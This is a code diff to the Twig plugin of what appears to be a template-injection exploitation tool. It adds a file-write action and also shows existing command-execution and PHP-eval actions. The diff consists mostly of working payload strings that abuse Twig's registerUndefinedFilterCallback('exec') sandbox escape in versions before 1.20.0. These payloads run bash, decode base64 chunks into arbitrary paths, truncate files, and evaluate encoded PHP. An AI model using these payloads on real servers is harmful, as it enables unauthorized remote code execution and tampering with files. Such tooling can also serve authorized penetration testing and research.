@@ -11,7 +11,8 @@ class Twig(php.Php):
         # The vulnerable versions <1.20.0 allows to map the getFilter() function
         # to any PHP function, allowing the sandbox escape.
         
-        # Functions with only 1 parameter can be used.
+        # Only functions with 1 parameter can be mapped and eval()/assert() functions are not
+        # allowed. For this reason, most of the stuff is done by exec() insted of eval()-like code.
 
         self.update_actions({
             'render' : {
@@ -27,7 +28,12 @@ class Twig(php.Php):
                     'res' : rand.randstrings[0]
                 }
             },
-            # Hackish way to evaluate PHP code, since eval/assert can't be mapped
+            'write' : {
+                'call' : 'inject',
+                'write' : """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c '{tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s'")}}""",
+                'truncate' : """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo -n >%(path)s")}}"""
+            },
+            # Hackish way to evaluate PHP code
             'evaluate' : {
                 'call': 'execute',
                 'evaluate': """php -r '$d="%(code_b64)s";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%%4,"=",STR_PAD_RIGHT)));'""",
@@ -44,7 +50,6 @@ class Twig(php.Php):
                 'call': 'inject',
                 'execute_blind': """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c '{eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}'")}}"""
             },
-            # Hackish way to evaluate PHP code, since eval/assert can't be mapped
             'evaluate_blind' : {
                 'call': 'execute',
                 'evaluate_blind': """php -r '$d="%(code_b64)s";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%%4,"=",STR_PAD_RIGHT)) . ") && sleep(%(delay)i);");'"""
